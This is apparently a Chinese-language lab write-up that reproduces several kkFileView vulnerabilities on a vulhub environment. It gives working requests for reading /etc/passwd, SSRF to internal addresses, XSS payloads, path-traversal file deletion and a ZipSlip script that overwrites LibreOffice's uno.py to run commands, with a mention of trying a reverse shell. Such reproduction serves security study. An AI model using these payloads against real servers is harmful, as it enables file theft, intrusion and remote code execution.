参考wp：[https://www.cnblogs.com/xbbth/p/17446987.html](https://www.cnblogs.com/xbbth/p/17446987.html)

[https://blog.csdn.net/qq_61475980/article/details/140604251](https://blog.csdn.net/qq_61475980/article/details/140604251)

[https://www.cnblogs.com/backlion/p/17372724.html](https://www.cnblogs.com/backlion/p/17372724.html)

[https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/kkFileView-ZipSlip-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/kkFileView-ZipSlip-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md)



kkFileView 是使用 Spring Boot 搭建的文档在线预览解决方案，能够支持多种主流办公文档的在线预览，如 doc、docx、xls、xlsx、ppt、pptx、pdf、txt、zip、rar 等格式。此外，还可以预览图片、视频、音频等多种类型的文件。


使用vulhub靶场复现

# 任意文件读取漏洞

**漏洞影响**

**kkFileview <=3.6.0**

**漏洞证明**

漏洞接口:[https://filepreview.xxxx.com/getCorsFile?urlPath=file:/](https://filepreview.zhongan.io/getCorsFile?urlPath=file:/)

 http://xxx.com//getCorsFile?urlPath=file:///etc/passwd



# SSRF漏洞

**漏洞影响**

kkFileview =v4.1.0

**漏洞证明**

1、kkFileview的getCorsFile接口存在SSRF漏洞，并且可读取任意文件。

[https://filepreview.xxxxx/getCorsFile?urlPath=file:///](https://filepreview.xxxxx/getCorsFile?urlPath=file:///)

2、通过该接口调用内网服务，并且进行访问，实现SSRF。

[https://filepreview.xxxxxx.com/getCorsFile?urlPath=http://192.168.1.1/](https://filepreview.xxxxxx.com/getCorsFile?urlPath=http://192.168.1.1/)

可以进行base64编码

# XSS漏洞

**漏洞影响**

kkFileview =v4.1.0

**漏洞证明**

http://xxx.com/onlinePreview?url=%3Cimg%20src=x%20οnerrοr=alert(0)%3E



URL1：[http://xxx.com2/onlinePreview?url=aHR0cDovL3d3dy5iYWlkdS5jb20vdGVzdC50eHQiPjxpbWcgc3JjPTExMSBvbmVycm9yPWFsZXJ0KDEpPg%3D%3D](http://xxx.com/onlinePreview?url=aHR0cDovL3d3dy5iYWlkdS5jb20vdGVzdC50eHQiPjxpbWcgc3JjPTExMSBvbmVycm9yPWFsZXJ0KDEpPg%3D%3D)

经过base64加URL编码`http://www.baidu.com/test.txt"><img src=111 onerror=alert(1)>`




URL2： [http://xxx.com/picturesPreview?urls=aHR0cDovL3d3dy5iYWlkdS5jb20vdGVzdC50eHQiPjxpbWcgc3JjPTExMSBvbmVycm9yPWFsZXJ0KDEpPg%3D%3D](URL2: http://xxx.com/picturesPreview?urls=aHR0cDovL3d3dy5iYWlkdS5jb20vdGVzdC50eHQiPjxpbWcgc3JjPTExMSBvbmVycm9yPWFsZXJ0KDEpPg%3D%3D

poc同理

经过base64加URL编码`http://www.baidu.com/test.txt"><img src=111 onerror=alert(1)>`


URL3：/picturesPreview?urls=&currentUrl=PHN2Zy9vbmxvYWQ9YWxlcnQoMSk%2B

对`<svg/onload=alert(1)>`进行base64加URL编码

# 任意文件上传导致存储xss

**漏洞影响**

kkFileView=4.1.0

**漏洞证明**

# 任意文件删除

漏洞影响

kkFileview= v4.0.0

漏洞证明

/deleteFile?fileName=demo%2F..\xss.pdf

get请求此uri会删除\kkFileView-master\server\src\main\file目录中的xss.pdf（原本只能删除\kkFileView-master\server\src\main\file\demo目录下的文件)

# 任意文件上传导致远程执行漏洞（可以尝试反弹shell）

[https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/kkFileView-ZipSlip-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/kkFileView-ZipSlip-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md)

**漏洞影响**

4.2.0-4.4.0

**漏洞证明**

启动docker环境

```Python
docker-compose up -d
```


服务启动后，访问`http://your-ip:8012`即可查看到首页。
![image](https://github.com/user-attachments/assets/55e715f6-33a2-45cb-8ab3-1a32c279c936)


目标在使用 odt 转 pdf 时会调用系统的 Libreoffice，而该进程会调用库中的 `uno.py` 文件，因此可以覆盖 `uno.py` 文件的内容实现 RCE。

首先，修改 [poc.py](https://github.com/vulhub/vulhub/blob/master/kkfileview/4.3-zipslip-rce/poc.py)：

```Python
import zipfile

if __name__ == "__main__":
    try:
        binary1 = b'vulhub'
        binary2 = b"import os\nos.system('touch /tmp/success')\n"
        zipFile = zipfile.ZipFile("test.zip", "a", zipfile.ZIP_DEFLATED)
        # info = zipfile.ZipInfo("test.zip")
        zipFile.writestr("test", binary1)
        zipFile.writestr("../../../../../../../../../../../../../../../../../../../opt/libreoffice7.5/program/uno.py", binary2)
        zipFile.close()
    except IOError as e:
        raise e
```
![image](https://github.com/user-attachments/assets/a09ed8ad-88c3-46d1-b6cc-b593fd9079e7)



执行 `poc.py`，生成 POC 文件，`test.zip` 将被写入当前目录。

```Python
python poc.py
```


然后，使用 kkFileView 服务上传`test.zip`：
![image](https://github.com/user-attachments/assets/0d64e2bd-2228-4470-b936-985dbc11c895)


点击`test.zip`的“预览”按钮，可以看到 zip 压缩包中的文件列表：


最后，上传任意一个 odt 文件，例如 [sample.odt](https://github.com/vulhub/vulhub/blob/master/kkfileview/4.3-zipslip-rce/sample.odt)，发起 Libreoffice 任务：

[sample.odt](https://flowus.cn/preview/839e1a62-b891-4dfc-97de-50575bba260e)
![image](https://github.com/user-attachments/assets/d53eb483-3dad-4c63-a5d7-f5158a753eac)


点击`sample.odt`的“预览”按钮，触发代码执行漏洞：
![image](https://github.com/user-attachments/assets/22774379-44cd-40c2-966d-b5ef9fb549e7)


可见，`touch /tmp/success`已经成功被执行：
![image](https://github.com/user-attachments/assets/4f895a9a-e97c-4c3c-947a-4662623f7677)

注意：生产环境禁止使用，会更改系统代码
![image](https://github.com/user-attachments/assets/ce32d3ad-b231-4167-9f11-f69e6d03c1f1)


